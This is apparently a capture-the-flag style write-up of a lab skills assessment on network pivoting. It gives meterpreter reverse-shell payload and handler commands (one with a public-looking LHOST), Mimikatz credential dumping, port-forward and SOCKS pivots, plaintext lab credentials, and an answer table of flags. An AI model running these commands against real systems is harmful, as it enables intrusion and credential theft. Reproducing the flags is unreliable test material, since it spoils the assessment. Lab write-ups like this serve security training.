# 🛰️ Title

## 🔍 Overview
[!ABSTRACT] This document provides a comprehensive walkthrough for conducting an advanced penetration test on a simulated corporate network environment. The assessment aims to uncover vulnerabilities, escalate privileges, and navigate through the network using various techniques such as pivoting, credential dumping, and lateral movement.

---

## 🛠️ Tools & Setup

### Required Tools
- [[Metasploit]]
- [[Kali Linux]]
- Windows 10 VM (for pivots)
- [[Nmap]]

### Initial Access
[!INFO] The initial access was gained through a web shell on the target network. Credentials were extracted and used to establish an SSH session.

```bash
# Web Shell Enumeration
curl http://webserver:8080/download.txt

# Extract credentials
cat download.txt

# Generate payload
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=9001 -f elf -o payload.elf

# Transfer payload to target
scp -i id_rsa payload.elf webadmin@TARGET:~/

# Metasploit handler setup
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 78.10.239.25
set LPORT 9001
run

# Execute payload on target
./payload.elf
```

---

## 🚀 Initial Pivoting & Enumeration

### Question 1: Find credentials directory
[!SUCCESS] The credentials directory was found in the `/home/webadmin` directory.

```bash
ls /home/webadmin/
cd /home/webadmin/credentials
cat users.txt
```

### Question 2: Extract credentials from file
[!SUCCESS] Credentials were extracted from `users.txt`.

```text
webadmin:passw0rd!
mlefay:Plain Human work!
vfrank:Imply wet Unmasked!
```

---

## 🚀 Pivot to New Network

### Question 3: Internal network discovery
[!CHECK] Using Nmap for network scanning.

```bash
nmap -sn 172.16.5.0/16
# Output IP addresses
hosts:
- 172.16.5.35
```

### Question 4: Pivot to discovered host
[!SUCCESS] Pivoting through meterpreter and RDP.

```bash
use auxiliary/server/socks_proxy
set SRVPORT 9050
run

sessions -i 1
portfwd add -l 23389 -p 3389 -r 172.16.5.35
bg

# Connect from Kali
xfreerdp /v:127.0.0.1:23389 /u:mlefay /p:'Plain Human work!'
```

### Question 5: Find vulnerable user
[!SUCCESS] Using Mimikatz to dump credentials.

```bash
mimikatz # privilege::debug
sekurlsa::logonpasswords
# Output:
Username: vfrank
Password: Imply wet Unmasked!
```

---

## 🚀 Lateral Movement

### Question 6: Pivot to next network
[!SUCCESS] Discover and pivot to the new network segment.

```bash
sessions -i 2
portfwd add -l 23389 -p 3389 -r 172.16.6.25
bg

# Connect from Kali
xfreerdp /v:127.0.0.1:23389 /u:vfrank /p:'Imply wet Unmasked!'
```

### Question 7: Access Domain Controller flag
[!SUCCESS] Network share access on the domain controller.

```bash
# Open File Explorer and browse to network drive
Z:
dir

# Read flag file
type Flag.txt
```

---

## 📜 Security Analysis - Question 7

**Network Share Misconfiguration:** 
- The Domain Controller was accessible via a mapped network drive.
- This allowed the user `vfrank` to access sensitive data on the DC.

**Privilege Escalation:**
- User account had elevated permissions, allowing access to critical resources on the domain controller.

**Poor Access Controls:**
- Mapped drives and shares were not properly secured or restricted.
  
**Attack Path:**
1. Compromised user account (vfrank)
2. Accessed network share on DC
3. Retrieved sensitive data

---

## 📄 Complete Skills Assessment Summary

| Question | Task | Answer | Method |
|----------|------|--------|---------|
| 1 | Find credentials directory | `webadmin` | Web shell enumeration |
| 2 | Extract credentials | `mlefay:Plain Human work!` | File contents analysis |
| 3 | Internal network discovery | `172.16.5.35` | Ping sweep |
| 4 | Pivot to discovered host | `S1ngl3-Piv07-3@sy-Day` | Meterpreter + RDP |
| 5 | Find vulnerable user | `vfrank` | LSASS analysis with Mimikatz |
| 6 | Pivot to next network | `N3tw0rk-H0pp1ng-f0R-FuN` | PowerShell enum + RDP |
| 7 | Access Domain Controller | `3nd-0xf-Th3-R@inbow!` | Network share access |

---

## 📈 Attack Path Overview

```
1. Web Shell (Initial Access)
   ↓
2. SSH Key Discovery (webadmin credentials)
   ↓
3. SSH Access → Network Enumeration (172.16.5.35)
   ↓
4. Meterpreter Payload → Pivoting Setup
   ↓
5. RDP Access (mlefay:Plain Human work!)
   ↓
6. LSASS Dump → Mimikatz Analysis (vfrank credentials)
   ↓
7. Network Enumeration → RDP Pivot (172.16.6.25)
   ↓
8. Network Share Access → Domain Controller
```

---

## 🔒 Security Recommendations

1. **Web Application Security:** Remove web shells, implement proper access controls.
2. **SSH Key Management:** Secure private keys, implement key rotation policies.
3. **Network Segmentation:** Implement VLAN separation to prevent lateral movement.
4. **Service Account Hygiene:** Use managed service accounts (MSA/gMSA).
5. **LSASS Protection:** Enable Credential Guard and LSA Protection.
6. **RDP Security:** Implement NLA, disable RDP where not needed.
7. **Network Shares:** Review and restrict domain controller access permissions.
8. **Monitoring:** Implement logging for pivoting activities and lateral movement.

---

## 📝 Key Takeaways

1. **SOCKS Version Compatibility:** Always match MSF SOCKS version with proxychains config.
2. **Port Forward vs SOCKS:** Port forwarding is often more reliable than SOCKS proxy.
3. **Session Stability:** Linux meterpreter payloads can be unstable; consider alternatives.
4. **Network Routes:** Ensure autoroute is properly configured before attempting pivots.
5. **Troubleshooting Order:** 
   - Check session status
   - Verify routes
   - Confirm proxy/port forward status
   - Test simple connections first

---

## 📝 Alternative Methods Summary

| Method | Pros | Cons | Reliability |
|--------|------|------|-------------|
| SOCKS Proxy | Protocol agnostic, multiple connections | Version conflicts, complex setup | Medium |
| Port Forward | Simple, direct, stable | One port at a time | High |
| SSH Tunneling | Built-in, no MSF needed | Requires SSH access | High |

**Recommendation:** Start with port forward for single services, use SOCKS for multiple protocols.

---

## 📝 Complete Command Reference

### Payload Generation & Transfer
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=9001 -f elf -o payload.elf
scp -i id_rsa payload.elf webadmin@TARGET:~/
```

### MSF Handler Setup
```bash
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 9001
run
```

### Routing & Pivoting
```bash
# Autoroute
run autoroute -s 172.16.5.0/16
run autoroute -p

# SOCKS Proxy
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set VERSION 4a
run

# Port Forward
portfwd add -l 13389 -p 3389 -r 172.16.5.35
portfwd list
```

### Target Connection
```bash
# Via SOCKS
proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!'

# Via Port Forward
xfreerdp /v:127.0.0.1:13389 /u:mlefay /p:'Plain Human work!'
```